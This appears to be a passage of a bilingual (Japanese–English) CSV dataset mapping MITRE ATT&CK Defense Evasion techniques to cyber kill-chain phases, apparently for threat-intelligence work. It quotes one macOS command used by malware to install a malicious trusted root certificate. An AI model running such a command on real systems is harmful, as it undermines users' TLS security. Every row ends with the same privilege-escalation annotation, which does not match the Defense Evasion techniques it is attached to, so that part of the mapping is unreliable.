Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.001,バイナリパディング,Binary Padding,"攻撃者はバイナリパディングを使用してジャンクデータを追加し、マルウェアのディスク上の表現を変更する可能性があります。これは、バイナリの機能や動作に影響を与えることなく行うことができますが、ファイルサイズの制限により一部のセキュリティツールが処理できる範囲を超えてバイナリのサイズを大きくする可能性があります。

バイナリパディングは、ファイルのチェックサムを効果的に変更し、ハッシュベースのブロックリストや静的ウイルス対策署名を回避するためにも使用できます。(引用: ESET OceanLotus) 使用されるパディングは、通常、ジャンクデータを作成する関数によって生成され、マルウェアの末尾に追加されるか、セクションに適用されます。(引用: Securelist Malware Tricks April 2017) ファイルサイズを大きくすると、大きなファイルをスキャンするように設計または構成されていない特定のツールや検出機能の有効性が低下する可能性があります。これにより、分析のために収集される可能性も低くなります。VirusTotalなどのパブリックファイルスキャンサービスは、分析対象としてアップロードされるファイルの最大サイズを制限しています。(引用: VirusTotal FAQ)","Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.

Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1599,ネットワーク境界ブリッジング,Network Boundary Bridging,"攻撃者は、境界ネットワークデバイスまたはネットワークセグメンテーションを担当する内部デバイスを侵害することにより、ネットワーク境界をブリッジする可能性があります。これらのデバイスを侵害すると、攻撃者は、信頼できるネットワークと信頼できないネットワークを分離するトラフィックルーティングの制限をバイパスできる可能性があります。

ルーターやファイアウォールなどのデバイスを使用して、信頼できるネットワークと信頼できないネットワークの間に境界を作成できます。これらは、IPアドレス、レイヤー4プロトコルポートを禁止したり、ディープパケットインスペクションを介してアプリケーションを識別したりすることにより、トラフィックタイプを制限して、そのような接続に固有のリスクを軽減しようとする組織ポリシーを施行することで実現します。ネットワークの他の部分に参加するために、これらのデバイスは直接アドレス指定可能または透過的にすることができますが、それらの動作モードは、侵害されたときに攻撃者がそれらをバイパスする方法には影響しません。

攻撃者がそのような境界デバイスを制御すると、そのポリシー施行をバイパスして、通常禁止されているトラフィックを2つの分離されたネットワーク間の信頼境界を越えて妨害なく通過させることができます。デバイス上で十分な権限を取得することにより、攻撃者はデバイスを再構成して目的のトラフィックを許可し、その後、[マルチホッププロキシ](https://attack.mitre.org/techniques/T1090/003)を介したコマンドアンドコントロールや[トラフィック複製](https://attack.mitre.org/techniques/T1020/001)を介したデータの持ち出しなどの目標をさらに達成できます。攻撃者はまた、ネットワークセグメンテーションを担当する内部デバイスを標的にし、これらを[内部プロキシ](https://attack.mitre.org/techniques/T1090/001)と組み合わせて悪用して同じ目標を達成する可能性があります。(引用: Kaspersky ThreatNeedle Feb 2021) 境界デバイスが2つの別々の組織を分離する場合、攻撃者は新しい被害者環境への横方向の移動も容易にすることができます。","Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.

Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.

When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",T1599.001,ネットワークアドレス変換トラバーサル,Network Address Translation Traversal,"攻撃者は、ネットワークデバイスのネットワークアドレス変換（NAT）構成を変更することにより、ネットワーク境界をブリッジする可能性があります。NATへの悪意のある変更により、攻撃者は、信頼できるネットワークと信頼できないネットワークを分離するトラフィックルーティングの制限をバイパスできる可能性があります。

複数のネットワークを接続するルーターやファイアウォールなどのネットワークデバイスは、ネットワーク間でパケットを渡すプロセス中にNATを実装する場合があります。NATを実行する場合、ネットワークデバイスはIPアドレスヘッダーの送信元アドレスおよび/または宛先アドレスを書き換えます。一部のネットワーク設計では、パケットが境界デバイスを通過するためにNATが必要です。これの典型的な例は、内部ネットワークがインターネットルーティング不可能なアドレスを利用する環境です。(引用: RFC1918)

攻撃者がネットワーク境界デバイスを制御すると、既存のNAT構成を利用して2つの分離されたネットワーク間でトラフィックを送信したり、独自の設計のNAT構成を実装したりできます。NATが機能するために必要なネットワーク設計の場合、これにより攻撃者は、通常、境界デバイスの背後にある保護されたシステムへのアクセスを防ぐ固有のルーティング制限を克服できます。NATを必要としないネットワーク設計の場合、ネットワーク境界デバイスを通過するパケットのアドレスを変更すると、防御側にとってデータ送信の監視がより困難になるため、攻撃者はNATを使用してアクティビティを隠蔽できます。

攻撃者は[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を使用してネットワークデバイスのオペレーティングシステムを変更し、アクティビティをさらに隠蔽するために独自のカスタムNATメカニズムを実装する場合があります。","Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.

Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)

When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.

Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1553,信頼制御の破壊,Subvert Trust Controls,"攻撃者は、信頼できないアクティビティについてユーザーに警告したり、信頼できないプログラムの実行を防いだりするセキュリティ制御を弱体化させる可能性があります。オペレーティングシステムやセキュリティ製品には、プログラムやWebサイトがある程度の信頼レベルを持っていると識別するメカニズムが含まれている場合があります。このような機能の例としては、有効なコード署名証明書によって署名されているためにプログラムの実行が許可されること、インターネットからダウンロードされた属性セットを持っているためにプログラムがユーザーに警告を表示すること、または信頼できないサイトに接続しようとしていることを示す表示が表示されることなどがあります。

攻撃者はこれらの信頼メカニズムを破壊しようとする可能性があります。攻撃者が使用する方法は、破壊しようとする特定のメカニズムによって異なります。攻撃者は、これらの制御を破壊することを支援するために、[ファイルおよびディレクトリのアクセス許可の変更](https://attack.mitre.org/techniques/T1222)または[レジストリの変更](https://attack.mitre.org/techniques/T1112)を実行する可能性があります。(引用: SpectorOps Subverting Trust Sept 2017) 攻撃者はまた、ターゲットシステム上で信頼を得るためにコード署名証明書を作成または盗む可能性もあります。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates)","Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.

Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)",T1553.005,Mark-of-the-Webバイパス,Mark-of-the-Web Bypass,"攻撃者は、特定のファイル形式を悪用して、Mark-of-the-Web（MOTW）制御を破壊する可能性があります。Windowsでは、インターネットからファイルがダウンロードされると、MOTWとして知られる特定の値を持つ<code>Zone.Identifier</code>という名前の非表示のNTFS代替データストリーム（ADS）でタグ付けされます。(引用: Microsoft Zone.Identifier 2020) MOTWでタグ付けされたファイルは保護され、特定の操作を実行できません。例えば、MS Office 10以降では、MS OfficeファイルにMOTWがある場合、保護ビューで開きます。MOTWでタグ付けされた実行可能ファイルは、Windows Defender SmartScreenによって処理され、ファイルが既知の実行可能ファイルの許可リストと比較されます。ファイルが不明/信頼できない場合、SmartScreenは実行を防ぎ、実行しないようにユーザーに警告します。(引用: Beek Use of VHD Dec 2020)(引用: Outflank MotW 2020)(引用: Intezer Russian APT Dec 2020)

攻撃者は、圧縮/アーカイブ（.arj、.gzip）やディスクイメージ（.iso、.vhd）ファイル形式などのコンテナファイルを悪用して、MOTWでタグ付けされない可能性のある悪意のあるペイロードを配信する可能性があります。インターネットからダウンロードされたコンテナファイルはMOTWでマークされますが、コンテナファイルが抽出および/またはマウントされた後、内部のファイルはMOTWを継承しない場合があります。MOTWはNTFSの機能であり、多くのコンテナファイルはNTFS代替データストリームをサポートしていません。コンテナファイルが抽出および/またはマウントされた後、内部のファイルはディスク上のローカルファイルとして扱われ、保護なしで実行される場合があります。(引用: Beek Use of VHD Dec 2020)(引用: Outflank MotW 2020)","Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)

Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1553,信頼制御の破壊,Subvert Trust Controls,"攻撃者は、信頼できないアクティビティについてユーザーに警告したり、信頼できないプログラムの実行を防いだりするセキュリティ制御を弱体化させる可能性があります。オペレーティングシステムやセキュリティ製品には、プログラムやWebサイトがある程度の信頼レベルを持っていると識別するメカニズムが含まれている場合があります。このような機能の例としては、有効なコード署名証明書によって署名されているためにプログラムの実行が許可されること、インターネットからダウンロードされた属性セットを持っているためにプログラムがユーザーに警告を表示すること、または信頼できないサイトに接続しようとしていることを示す表示が表示されることなどがあります。

攻撃者はこれらの信頼メカニズムを破壊しようとする可能性があります。攻撃者が使用する方法は、破壊しようとする特定のメカニズムによって異なります。攻撃者は、これらの制御を破壊することを支援するために、[ファイルおよびディレクトリのアクセス許可の変更](https://attack.mitre.org/techniques/T1222)または[レジストリの変更](https://attack.mitre.org/techniques/T1112)を実行する可能性があります。(引用: SpectorOps Subverting Trust Sept 2017) 攻撃者はまた、ターゲットシステム上で信頼を得るためにコード署名証明書を作成または盗む可能性もあります。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates)","Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.

Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)",T1553.002,コード署名,Code Signing,"攻撃者は、マルウェアやツールに署名するために、コード署名マテリアルを作成、取得、または盗む可能性があります。コード署名は、開発者からのバイナリの信頼性のレベルと、バイナリが改ざんされていないことの保証を提供します。(引用: Wikipedia Code Signing) 操作中に使用される証明書は、攻撃者によって作成、取得、または盗まれる可能性があります。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates) [無効なコード署名](https://attack.mitre.org/techniques/T1036/001)とは異なり、このアクティビティは有効な署名になります。

初回実行時にソフトウェアを検証するためのコード署名は、最新のWindowsおよびmacOSシステムで使用できます。プラットフォームの分散型の性質のため、Linuxでは使用されません。(引用: Wikipedia Code Signing)(引用: EclecticLightChecksonEXECodeSigning)

コード署名証明書は、システム上で署名済みコードの実行を要求するセキュリティポリシーをバイパスするために使用される場合があります。","Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.

Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)

Code signing certificates may be used to bypass security policies that require signed code to execute on a system.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1553,信頼制御の破壊,Subvert Trust Controls,"攻撃者は、信頼できないアクティビティについてユーザーに警告したり、信頼できないプログラムの実行を防いだりするセキュリティ制御を弱体化させる可能性があります。オペレーティングシステムやセキュリティ製品には、プログラムやWebサイトがある程度の信頼レベルを持っていると識別するメカニズムが含まれている場合があります。このような機能の例としては、有効なコード署名証明書によって署名されているためにプログラムの実行が許可されること、インターネットからダウンロードされた属性セットを持っているためにプログラムがユーザーに警告を表示すること、または信頼できないサイトに接続しようとしていることを示す表示が表示されることなどがあります。

攻撃者はこれらの信頼メカニズムを破壊しようとする可能性があります。攻撃者が使用する方法は、破壊しようとする特定のメカニズムによって異なります。攻撃者は、これらの制御を破壊することを支援するために、[ファイルおよびディレクトリのアクセス許可の変更](https://attack.mitre.org/techniques/T1222)または[レジストリの変更](https://attack.mitre.org/techniques/T1112)を実行する可能性があります。(引用: SpectorOps Subverting Trust Sept 2017) 攻撃者はまた、ターゲットシステム上で信頼を得るためにコード署名証明書を作成または盗む可能性もあります。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates)","Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.

Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)",T1553.004,ルート証明書のインストール,Install Root Certificate,"攻撃者は、攻撃者が制御するWebサーバーに接続する際の警告を回避するために、侵害されたシステムにルート証明書をインストールする可能性があります。ルート証明書は、公開鍵暗号方式でルート認証局（CA）を識別するために使用されます。ルート証明書がインストールされると、システムまたはアプリケーションは、ルート証明書によって署名されたルートの信頼チェーン内の証明書を信頼します。(引用: Wikipedia Root Certificate) 証明書は一般的に、Webブラウザ内で安全なTLS/SSL通信を確立するために使用されます。ユーザーが信頼できない証明書を提示するWebサイトを閲覧しようとすると、セキュリティリスクをユーザーに警告するエラーメッセージが表示されます。セキュリティ設定によっては、ブラウザがユーザーがWebサイトへの接続を確立することを許可しない場合があります。

侵害されたシステムにルート証明書をインストールすると、攻撃者はそのシステムのセキュリティを低下させる方法を得ることになります。攻撃者はこのテクニックを使用して、ログイン資格情報を収集するために正当なウェブサイトを偽装する攻撃者が制御するウェブサーバーに、侵害されたシステムがHTTPS経由で接続する際にユーザーに警告するセキュリティ警告を回避しています。(引用: Operation Emmental)

非定型のルート証明書も、製造元またはソフトウェアサプライチェーンによってシステムにプリインストールされており、安全なTLS/SSL通信で送信される情報を傍受するための[中間者攻撃](https://attack.mitre.org/techniques/T1557)機能を提供するためにマルウェア/アドウェアと組み合わせて使用​​されていました。(引用: Kaspersky Superfish)

ルート証明書（および関連するチェーン）も複製して再インストールできます。複製された証明書チェーンは、ソースと同じメタデータ特性の多くを持ち、署名検証ツール（Sysinternals、ウイルス対策ソフトなど）をバイパスして実行をブロックしたり、永続性のアーティファクトを明らかにしたりする可能性のある悪意のあるコードに署名するために使用できます。(引用: SpectorOps Code Signing Dec 2017)

macOSでは、Ay MaMiマルウェアは<code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code>を使用して、悪意のある証明書を信頼されたルート証明書としてシステムキーチェーンにインストールします。(引用: objective-see ay mami 2018)","Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.

Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)

Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)

Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)

In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

